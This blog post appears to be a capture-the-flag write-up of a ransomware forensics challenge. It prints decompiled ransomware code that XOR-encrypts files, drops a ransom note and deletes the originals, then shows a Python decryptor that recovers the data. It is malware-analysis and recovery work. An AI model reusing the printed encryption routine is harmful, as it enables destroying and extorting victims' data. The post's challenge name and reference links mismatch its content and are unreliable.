---
layout: post
author: Julio
date: 07-05-2024
title: LockPick1 Write-Up
---

<div class="center"><img src="https://labs.hackthebox.com/storage/challenges/605ff764c617d3cd28dbbdd72be8f9a2.png" width="350"></div>

# LockPick1 Write-Up

## Introduction

<p>Recollection is an "Easy" sherlock challenge on HackTheBox. This is the scenario: "Forela needs your help! A whole portion of our UNIX servers have been hit with what we think is ransomware. We are refusing to pay the attackers and need you to find a way to recover the files provided. Warning This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. Once the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed."</p>
<p>We start with a file called <custom-code>lockpick1.zip</custom-code> and we unzip it to get <custom-code>bescrypt.zip</custom-code> and a bunch of encrypted files inside a folder called <custom-code>forela-criticaldata</custom-code>. We can unzip the second compressed file with a password inside a note that we get when decompressing the first file. We will get a Linux binary called <custom-code>bescrypt3.2</custom-code>.</p>

## Questions

### 1. Please confirm the encryption key string utilised for the encryption of the files provided?

```c
undefined8 main(void)

{
  process_directory("/forela-criticaldata/","bhUlIshutrea98liOp");
  return 0;
}
```

```c
void process_directory(char *param_1,undefined8 param_2)

{
  int iVar1;
  char *pcVar2;
  char local_418 [1024];
  dirent *local_18;
  DIR *local_10;

  local_10 = opendir(param_1);
  if (local_10 == (DIR *)0x0) {
    printf("Error opening directory: %s\n",param_1);
  }
  else {
    while (local_18 = readdir(local_10), local_18 != (dirent *)0x0) {
      iVar1 = strcmp(local_18->d_name,".");
      if ((iVar1 != 0) && (iVar1 = strcmp(local_18->d_name,".."), iVar1 != 0)) {
        snprintf(local_418,0x400,"%s/%s",param_1,local_18->d_name);
        if (local_18->d_type == '\x04') {
          process_directory(local_418,param_2);
        }
        else if ((local_18->d_type == '\b') &&
                (((((pcVar2 = strstr(local_18->d_name,".txt"), pcVar2 != (char *)0x0 ||
                    (pcVar2 = strstr(local_18->d_name,".sql"), pcVar2 != (char *)0x0)) ||
                   (pcVar2 = strstr(local_18->d_name,".pdf"), pcVar2 != (char *)0x0)) ||
                  ((pcVar2 = strstr(local_18->d_name,".docx"), pcVar2 != (char *)0x0 ||
                   (pcVar2 = strstr(local_18->d_name,".xlsx"), pcVar2 != (char *)0x0)))) ||
                 ((pcVar2 = strstr(local_18->d_name,".csv"), pcVar2 != (char *)0x0 ||
                  ((pcVar2 = strstr(local_18->d_name,".json"), pcVar2 != (char *)0x0 ||
                   (pcVar2 = strstr(local_18->d_name,".xml"), pcVar2 != (char *)0x0)))))))) {
          printf("Encrypting: %s\n",local_418);
          encrypt_file(local_418,param_2);
        }
      }
    }
    closedir(local_10);
  }
  return;
}
```

<p>We can confirm that the key is <custom-code>bhUlIshutrea98liOp</custom-code>.</p>

```c
void encrypt_file(char *param_1,char *param_2)

{
  byte bVar1;
  ulong uVar2;
  int iVar3;
  size_t sVar4;
  char local_848 [1024];
  char local_448 [1032];
  FILE *local_40;
  void *local_38;
  size_t local_30;
  FILE *local_28;
  ulong local_20;

  local_28 = fopen(param_1,"rb");
  if (local_28 == (FILE *)0x0) {
    printf("Error opening file: %s\n",param_1);
  }
  else {
    fseek(local_28,0,2);
    local_30 = ftell(local_28);
    rewind(local_28);
    local_38 = malloc(local_30);
    fread(local_38,1,local_30,local_28);
    fclose(local_28);
    for (local_20 = 0; uVar2 = local_20, (long)local_20 < (long)local_30; local_20 = local_20 + 1) {
      bVar1 = *(byte *)((long)local_38 + local_20);
      sVar4 = strlen(param_2);
      *(byte *)((long)local_38 + local_20) = bVar1 ^ param_2[uVar2 % sVar4];
    }
    snprintf(local_448,0x400,"%s.24bes",param_1);
    local_28 = fopen(local_448,"wb");
    fwrite(local_38,1,local_30,local_28);
    fclose(local_28);
    free(local_38);
    snprintf(local_848,0x400,"%s_note.txt",local_448);
    local_40 = fopen(local_848,"w");
    if (local_40 == (FILE *)0x0) {
      printf("Error creating note file: %s\n",local_848);
    }
    else {
      fwrite("This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com  to discuss payment for us providing you the decryption software..\n"
             ,1,0x99,local_40);
      fclose(local_40);
    }
    iVar3 = remove(param_1);
    if (iVar3 != 0) {
      printf("Error deleting original file: %s\n",param_1);
    }
  }
  return;
}
```

<p>We can</p>

```python
#!/usr/bin/python3

import os

files = []
key = "bhUlIshutrea98liOp"

def listFiles():
    my_files = os.listdir(".")
    for file in my_files:
        try:
            if file.split(".")[2] == "24bes":
                files.append(file)
        except:
            pass

def decryptFiles():
    for file in files:
        with open(file, "rb") as encrypted_file:
            data = encrypted_file.read()
            key_bytes = key.encode("utf-8")
            decrypted_data = bytes([byte ^ key_bytes[i % len(key_bytes)] for i, byte in enumerate(data)])

            print(f'[!] Decrypting {file}...')
            with open(file + ".decrypted", "wb") as d_file:
                d_file.write(decrypted_data)
                d_file.close()
            encrypted_file.close()

listFiles()
decryptFiles()
```

<p>We get the following output:</p>

```bash
python3 decrypt_files.py
[!] Decrypting complaints.csv.24bes...
[!] Decrypting sales_forecast.xlsx.24bes...
[!] Decrypting customer-feedback.json.24bes...
[!] Decrypting it_assets.xml.24bes...
[!] Decrypting forela_uk_applicants.sql.24bes...
[!] Decrypting trading-firebase_bkup.json.24bes...
```

### 2. We have recently recieved an email from wbevansn1@cocolog-nifty.com demanding to know the first and last name we have him registered as. They believe they made a mistake in the application process. Please confirm the first and last name of this applicant.

<p>We can run</p>

```bash
cat forela_uk_applicants.sql.24bes.decrypted | grep wbev
(830,'Walden','Bevans','wbevansn1@cocolog-nifty.com','Male','Aerospace Manufacturing','2023-02-16'),
```

<p>The right answer is <custom-code>Walden Bevans</custom-code>.</p>

## References

- <a href="https://app.hackthebox.com/sherlocks/Recollection">https://app.hackthebox.com/sherlocks/Recollection</a>
- <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet">https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet</a>
- <a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference">https://github.com/volatilityfoundation/volatility/wiki/Command-Reference</a>
